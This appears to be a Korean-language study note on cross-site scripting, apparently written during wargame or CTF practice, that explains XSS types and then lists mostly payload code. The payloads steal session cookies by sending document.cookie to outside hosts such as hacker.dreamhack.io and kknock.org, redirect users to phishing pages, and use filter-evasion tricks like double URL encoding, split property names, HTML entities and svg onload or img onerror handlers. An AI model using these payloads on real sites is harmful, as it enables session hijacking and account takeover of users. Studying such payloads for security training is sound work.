# 기본개념
웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에서 해당 스크립트를 실행시킴
특정 계정의 세션 정보를 탈취하고 해당 계정으로 임의의 기능을 수행할 수 있음
SOP 보안 정책이 등장하면서 서로 다른 오리진에서는 정보를 읽는 행위가 이전에 비해 힘들어졌지만
이를 우회하는 다양한 기술이 소개되면서 XSS 공격은 지속되고 있음


# XSS 종류
Stored XSS
XSS에 사용되는 악성 스크립트가 서버에 저장되고 서버의 응답에 담겨오는 XSS

Reflected XSS
XSS에 사용되는 악성 스크립트가 URL에 삽입되고 서버의 응답에 담겨오는 XSS

DOM-based XSS
XSS에 사용되는 악성 스크립트가 URL Fragment에 삽입되는 XSS
Fragment는 서버 요청/응답 에 포함되지 않음

Universal XSS
클라이언트의 브라우저 혹은 브라우저의 플러그인에서 발생하는 취약점으로 SOP 정책을 우회하는 XSS


# 스크립트 예시
쿠키 및 세션 탈취 코드

```javascript
<script>
// "hello" 문자열 alert 실행
alert("hello");
// 현재 페이지의 쿠키(return type: string)
document.cookie; 
// 현재 페이지의 쿠키를 인자로 가진 alert 실행
alert(document.cookie);
// 쿠키 생성(key: name, value: test)
document.cookie = "name=test;";
// new Image() 는 이미지를 생성하는 함수이며, src는 이미지의 주소를 지정. 공격자 주소는 http://hacker.dreamhack.io
// "http://hacker.dreamhack.io/?cookie=현재페이지의쿠키" 주소를 요청하기 때문에 공격자 주소로 현재 페이지의 쿠키 요청함
new Image().src = "http://hacker.dreamhack.io/?cookie=" + document.cookie;
</script>
```

페이지 변조 공격 코드
```javascript
<script>
// 이용자의 페이지 정보에 접근
document;
// 이용자의 페이지에 데이터를 삽입
document.write("Hacked By DreamHack !");
</script>
```


위치 이동 공격 코드
```javascript
<script>
// 이용자의 위치를 변경
// 피싱 공격 등으로 사용됨
location.href = "http://hacker.dreamhack.io/phishing"; 
// 새 창 열기, 근데 잘 안되는 것 같음..
window.open("http://hacker.dreamhack.io/")
</script>
```


우회 코드
```javascript
<script>location.href="http://localhost:8080/?cookie="+document.cookie</script>
<img src=x onerror=this.src="http://localhost:8080/?cookie="+document.cookie>
<script>document.write("<img src=http://localhost:8080?cookie="+document.cookie+">")</script>
<script>document.write("<img style='display: none;' src=http://localhost:8080?cookie="+document.cookie+">")</script>
```


on, script, :javascript필터링 우회 시나리오
```javascript
<img src="/memo?memo='test'">
<script>location.href="/memo?memo="+document.cookie</script>
<sconript> document["locatio"+"n"].href="/memo?memo="+document.cookie </soncript>
<img src="/unvalid-url" onerror="/memo?memo="+document.cookie>
<img src="/unvalid-url" oonnerror="/memo?memo="+document.cookie>
<img src="/unvalid-url" oonnerror="document['locatio'+'n'].href='/memo?memo='+document.cookie">
```


단순 공백 치환 우회는 이렇게 쉽게 우회할수 있음
location.href 처럼 어떤 객체의 속성값이 될 수 있다면 
document[location].href 이런식으로 더 노련하게 우회할 수 있음


# 주의할 점
<script src="/vuln?param=alert(1)"></script>와 
<script>location.href="/vuln?param=alert(1)"</script>는 동작이 다름

```chatgpt
<script src="/vuln?param=alert(1)"></script>: 이 코드는 /vuln?param=alert(1) URL에서 스크립트 파일을 로드하려고 시도합니다. 만약 웹 서버가 이 URL에 대한 스크립트 파일을 반환하면 브라우저는 해당 스크립트를 실행하고 alert(1)을 실행할 것입니다. 이는 XSS (Cross-Site Scripting) 공격의 일반적인 형태입니다.

<script>location.href="/vuln?param=alert(1)"</script>: 이 코드는 현재 페이지를 /vuln?param=alert(1)로 리다이렉트하는 JavaScript 코드입니다. 스크립트가 실행되면 현재 페이지의 URL이 /vuln?param=alert(1)로 변경되고, 브라우저는 이 URL로 이동하게 됩니다. 따라서 이 코드도 사용자에게 alert(1)을 실행시킬 수 있지만, 이것은 간접적인 방법으로 이루어지며 원래 페이지에서 다른 페이지로 이동하는 방식입니다.
```




# 실제 페이로드
### 더블 URL 인코딩 우회
```javascript
<script>location.href="/memo?memo="+document.cookie</script>
\u003Cscript\u003Elocation.href="/memo?memo="+document.cookie\u003C/script\u003E
\u003C\u003E
%253Cscript%253Elocation.href="/memo?memo="+document.cookie%253C/script%253E

<svg/onload=location['hr'+'ef']='/memo?memo='+document['cookie']>
```

### img태그의 onerror
```javascript
<script>location.href="/memo?memo="+document.cookie</script>
<img src="/unvalid-url" onerror="/memo?memo="+document.cookie>
<img src="/unvalid-url" onerror="location.href('/memo?memo='+document.cookie);">
<img src="3" onerror="location.href('/memo?memo=' + document.cookie);">

<svg/onload=location.href="/memo?memo="+document.cookie>
<svg/onload=location["href"]="/memo?memo="+document["cookie"]>
```

# on, script, :javascript필터링

```javascript
<img src="/memo?memo='test'">
<script>location.href="/memo?memo="+document.cookie</script>
<sconript> document["locatio"+"n"].href="/memo?memo="+document.cookie </soncript>
<img src="/unvalid-url" onerror="/memo?memo="+document.cookie>
<img src="/unvalid-url" oonnerror="/memo?memo="+document.cookie>
<img src="/unvalid-url" oonnerror="document['locatio'+'n'].href='/memo?memo='+document.cookie">
```

# 기본적인 태그 우회
```javascript
<img src="" onerror="alert()">
<scrIpt>alert();</scripT>
<img src="" &#x6f;nerror="alert()">
<img src=about: onerror=alert(document.domain)>
<svg src=about: onload=alert(document.domain)>
<body onload=alert(document.domain)>
<video><source onerror=alert(document.domain)></video>
<iframe srcdoc="<&#x69;mg src=1 &#x6f;nerror=alert(parent.document.domain)>">
<iframe srcdoc='<img src=about: o&#110;error=parent.alert(document.domain)>'></iframe>
```

# hspace - turndown
https://github.com/mixmark-io/turndown/blob/master/src/turndown.js
```javascript
<script><script>location.href='https://kknock.org/'+document.cookie;<</script>/</script>script>
```